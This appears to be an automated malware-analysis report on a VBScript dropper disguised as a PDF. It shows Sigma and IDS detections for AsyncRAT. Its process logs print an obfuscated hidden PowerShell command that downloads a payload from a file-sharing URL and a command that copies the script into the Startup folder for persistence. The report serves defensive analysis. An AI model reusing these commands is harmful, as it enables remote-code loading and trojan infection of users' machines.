sigma_analysis_results.rule_title: Potential PowerShell Obfuscation Via Reversed Commands
sigma_analysis_results.rule_description: Detects the presence of reversed PowerShell commands in the CommandLine. This is often used as a method of obfuscation by attackers
sigma_analysis_results.rule_author: Teymur Kheirkhabarov (idea), Vasiliy Burov (rule), oscd.community, Tim Shelton

match_context.values: @{Hashes=SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; CurrentDirectory=C:\Windows\system32\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; EventID=1; ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -command $Codigo = ' [TRUNCATED]; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -windowstyle hidden -executionpolicy bypass -NoProfile -command "&( $pSHOMe[4]+$psHOME[30]+'X') (('PhRimageUrl'+' = fXYhttps://1017.filemail.com/api/f'+'ile/get?f'+'ilekey=2'+'Aa_bWo9Reu45t7BU1kVgsd9pT9pgSSlvStGrnTICfFhmTKj3LC6SQtIcOc_T35w&pk_vid=fd4f614bb209c62c1730945176a0904f fXY;PhR'+'webClient = New-Object System.Net.WebClient;PhRi'+'mageBytes = PhRwebClient.'+'DownloadData(PhRimageUrl);PhRimageText = [Sy'+'stem.Text.Enco'+'ding]:: [TRUNCATED]; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=Medium; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects a file ending in jse, vbe, js, vba, vbs written by cscript.exe or wscript.exe

match_context.values: @{RuleName=T1023; Image=C:\Windows\SysWOW64\wscript.exe; EventID=11; TargetFilename=C:\Users\Bruno\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\CJJ.vbs}

sigma_analysis_results.rule_title: Outbound Network Connection Initiated By Script Interpreter
sigma_analysis_results.rule_description: Detects a script interpreter wscript/cscript opening a network connection to a non-local network. Adversaries may use script to download malicious payloads.

match_context.values: @{SourceIsIpv6=false; DestinationPort=80; DestinationIp=172.67.187.200; Protocol=tcp; SourceIp=172.16.1.5; DestinationIsIpv6=false; EventID=3; SourcePort=65386; Image=C:\Windows\SysWOW64\wscript.exe; Initiated=true}

@{SourceIsIpv6=true; DestinationPort=53; DestinationIp=808:808:b9a:ffff:d103:0:0:0; Protocol=udp; SourceIp=c0a8:20b:0:0:b8c1:cac8:8cae:ffff; DestinationIsIpv6=true; EventID=3; Image=C:\Windows\System32\WScript.exe; SourcePort=56723; Initiated=true}

@{SourceIsIpv6=false; DestinationPort=80; DestinationIp=188.114.97.7; Protocol=tcp; SourceIp=192.168.2.11; DestinationIsIpv6=false; EventID=3; SourcePort=49716; Image=C:\Windows\System32\WScript.exe; Initiated=true}

sigma_analysis_results.rule_description:
Adversaries may use hidden windows to conceal malicious activity from the plain sight of users.
In some cases, windows that would typically be displayed when an application carries out an operation can be hidden

sigma_analysis_results.rule_title: Potential Encoded PowerShell Patterns In CommandLine
sigma_analysis_results.rule_description: Detects specific combinations of encoding methods in PowerShell via the commandline
sigma_analysis_results.rule_author: Teymur Kheirkhabarov (idea), Vasiliy Burov (rule), oscd.community, Tim Shelton

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

match_context.values: @{Hashes=SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; CurrentDirectory=C:\Windows\system32\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\System32\cmd.exe" /c ping 127.0.0.1 -n 10 & powershell -command [System.IO.File]::Copy('C:\Windows\system32\4919848ca5848919848484911555458_INFORMACION_COMPLETA_pdf.vbs', 'C:\Users\' + [Environment]::UserName + ''\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ sbv.JJC.vbs')'); CommandLine=powershell  -command [System.IO.File]::Copy('C:\Windows\system32\4919848ca5848919848484911555458_INFORMACION_COMPLETA_pdf.vbs', 'C:\Users\' + [Environment]::UserName + ''\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ sbv.JJC.vbs')'); EventID=1; ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=Medium; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

crowdsourced_ids_results.rule_category: Domain Observed Used for C2 Detected
crowdsourced_ids_results.rule_msg: ET MALWARE Observed Malicious SSL Cert (AsyncRAT Server)
crowdsourced_ids_results.rule_raw: alert tls $EXTERNAL_NET any -> $HOME_NET any (msg:"ET MALWARE Observed Malicious SSL Cert (AsyncRAT Server)"; flow:established,to_client; tls.cert_issuer; content:"AsyncRAT Server"; reference:md5,f69cadedae72d9d1a1d1578b56c39404; classtype:domain-c2; sid:2030673; rev:2; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_and_Server, created_at 2020_08_11, deployment Perimeter, malware_family AsyncRAT, performance_impact Low, signature_severity Major, tag SSL_Malicious_Cert, updated_at 2022_03_24, reviewed_at 2024_04_01, mitre_tactic_id TA0011, mitre_tactic_name Command_And_Control, mitre_technique_id T1071, mitre_technique_name Application_Layer_Protocol;)

crowdsourced_ids_results.rule_msg: ET MALWARE Generic AsyncRAT Style SSL Cert

crowdsourced_ai_results.analysis:
The code consists of several functions that appear to manipulate XML data related to print job settings.  The `tectipennas`, `polina`, and `planturoso` functions process and modify XML nodes, likely configuring print parameters.  `gymnoblasto` creates new XML nodes with specified attributes and values.  `centeio` extracts data from an XML document. `lismar` sets XML namespaces. `ningum` retrieves a node's base name based on a namespace. `inoficiosamente` appears to be a placeholder function.

A notable aspect is the use of `MSXML2.ServerXMLHTTP.6.0` to perform a GET request to a URL constructed by decoding a long string (`propulsivo`) through repeated replacement of a shorter string (`ulano`). The response is then executed using `ExecuteGlobal`.  This suggests a remote code download capability. The functions `tectipennas`, `polina`, and `planturoso` all interact extensively with XML data, suggesting manipulation of print job configurations.
